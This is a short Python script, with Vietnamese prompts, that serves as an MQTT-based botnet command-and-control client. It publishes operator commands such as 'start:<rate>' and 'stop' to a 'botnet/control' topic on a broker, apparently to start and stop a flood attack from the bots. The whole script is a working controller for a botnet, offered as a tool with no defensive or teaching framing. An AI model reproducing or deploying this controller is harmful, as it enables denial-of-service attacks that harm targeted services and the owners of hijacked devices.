import paho.mqtt.client as mqtt
import time

BROKER_IP = 'broker-ip'
BROKER_PORT = 1883
CONTROL_TOPIC = 'botnet/control'

def send_command(command):
    client = mqtt.Client()
    client.connect(BROKER_IP, BROKER_PORT, 60)
    client.loop_start()
    print(f"Sending command: {command}")
    client.publish(CONTROL_TOPIC, command)
    time.sleep(1)  # Chờ gửi xong
    client.loop_stop()
    client.disconnect()

if __name__ == "__main__":
    while True:
        cmd = input("Nhập lệnh (start:<rate> hoặc stop): ").strip()
        if cmd.lower() in ['exit', 'quit']:
            break
        if cmd.startswith('start:') or cmd == 'stop':
            send_command(cmd)
        else:
            print("Lệnh không hợp lệ. Ví dụ: start:200 hoặc stop")
